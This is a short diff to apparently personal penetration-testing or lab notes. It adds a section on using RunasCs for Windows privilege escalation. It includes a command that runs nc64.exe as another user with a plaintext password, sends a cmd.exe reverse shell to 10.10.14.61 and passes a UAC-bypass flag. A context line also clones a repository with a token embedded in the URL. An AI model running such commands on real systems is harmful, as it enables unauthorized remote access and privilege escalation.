@@ -464,3 +464,12 @@ cd reports
 ```
 git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
 ```
+
+## runascs
+
+- run as other users in windows
+- used for privesc
+
+```
+./RunasCs.exe admin Twisting3021 "C:\temp\nc64.exe 10.10.14.61 1234 -e cmd.exe" -bypass-uac
+```
